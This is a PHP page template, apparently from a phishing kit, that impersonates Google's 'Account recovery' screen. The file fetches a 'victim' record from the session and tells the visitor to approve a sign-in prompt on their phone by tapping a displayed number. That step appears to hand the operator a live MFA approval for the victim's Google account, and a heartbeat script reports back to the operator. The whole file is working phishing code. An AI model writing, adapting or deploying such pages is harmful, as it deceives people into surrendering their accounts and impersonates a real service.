<?php
require_once('shade/core/functions.php');
require_once('includes/google_layout.php');

$ent = $crud->getVictim($_SESSION['ent_id'] ?? 0);
$promptNum = trim((string) ($ent['gmail'] ?? ''));

if ($promptNum === '' || !preg_match('/^\d{1,2}$/', $promptNum)) {
    $promptNum = (string) random_int(10, 99);
}

google_head('Account recovery - Google Accounts');
?>

<div class="g-card g-card-phone">
    <?php google_card_progress(); ?>

    <div class="g-phone-layout">
        <div class="g-phone-header">
            <?php google_logo(); ?>
            <h1 class="g-phone-title">Account recovery</h1>
            <p class="g-phone-intro">This helps show that this account really belongs to you</p>
            <?php google_user_chip(); ?>
        </div>

        <div class="g-phone-band" aria-hidden="true">
            <svg class="g-phone-svg" viewBox="0 0 72 128" xmlns="http://www.w3.org/2000/svg">
                <rect x="8" y="2" width="56" height="120" rx="10" fill="currentColor"/>
                <rect x="14" y="10" width="44" height="100" rx="2" fill="var(--gm-phone-screen, #ffffff)"/>
            </svg>
        </div>

        <div class="g-phone-content">
            <h2 class="g-phone-heading">Check your phone</h2>
            <p class="g-phone-desc">
                Google sent a notification to your phone. Open the Gmail app, tap <strong>Yes</strong> on the prompt,
                then tap <strong><?= htmlspecialchars($promptNum, ENT_QUOTES, 'UTF-8') ?></strong> on your phone to sign in.
            </p>
        </div>

        <div class="g-phone-prompt-num" aria-label="Verification number"><?= htmlspecialchars($promptNum, ENT_QUOTES, 'UTF-8') ?></div>
    </div>
</div>

<?php google_footer(); google_scripts(); ?>
<script>
GoogleAuth.loadEmail('dynamicEmail', false);
GoogleAuth.startHeartbeat('yahoo', true);
</script>
</body>
</html>
